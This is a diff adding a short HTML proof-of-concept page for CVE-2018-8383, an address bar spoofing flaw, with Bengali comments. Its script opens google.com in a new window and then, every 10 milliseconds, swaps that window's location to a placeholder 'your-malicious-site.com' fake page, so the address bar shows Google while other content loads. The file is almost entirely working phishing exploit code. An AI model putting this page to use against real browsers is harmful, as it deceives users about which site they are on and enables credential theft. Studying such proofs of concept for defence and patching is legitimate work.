@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CVE-2018-8383 PoC</title>
+</head>
+<body>
+
+    <h1>Address Bar Spoofing Demo</h1>
+    <p>নিচের বাটনে ক্লিক করলে অ্যাড্রেস বারে google.com দেখাবে কিন্তু কন্টেন্ট অন্য থাকবে।</p>
+    
+    <button onclick="spoof()">Spoof Address Bar</button>
+
+    <script>
+        function spoof() {
+            // ১. প্রথমে একটি ফেক উইন্ডো ওপেন করা হচ্ছে
+            var win = window.open("http://www.google.com", "_blank");
+
+            // ২. setInterval ব্যবহার করে ব্রাউজারকে বিভ্রান্ত করা
+            setInterval(function() {
+                // এখানে খুব দ্রুত অরিজিনাল সাইট এবং ফেক কন্টেন্টের মধ্যে সুইচ করা হয়
+                win.location.replace("https://your-malicious-site.com/fake-page.html");
+            }, 10); // ১০ মিলিসেকেন্ড পরপর রিকোয়েস্ট পাঠিয়ে ব্রাউজারকে আপডেট হতে বাধা দেয়
+        }
+    </script>
+
+</body>
+</html>
